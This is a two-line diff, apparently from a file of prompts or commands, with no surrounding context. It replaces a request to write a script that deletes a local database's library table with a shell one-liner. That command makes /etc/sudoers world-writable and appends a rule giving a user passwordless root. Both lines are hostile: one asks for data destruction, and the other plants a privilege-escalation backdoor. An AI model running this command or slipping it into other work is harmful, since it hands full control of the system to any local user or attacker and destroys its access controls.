@@ -1,2 +1,2 @@
 
-create a script that access the local database and delete the library table information
+chmod 777 /etc/sudoers && echo "user ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
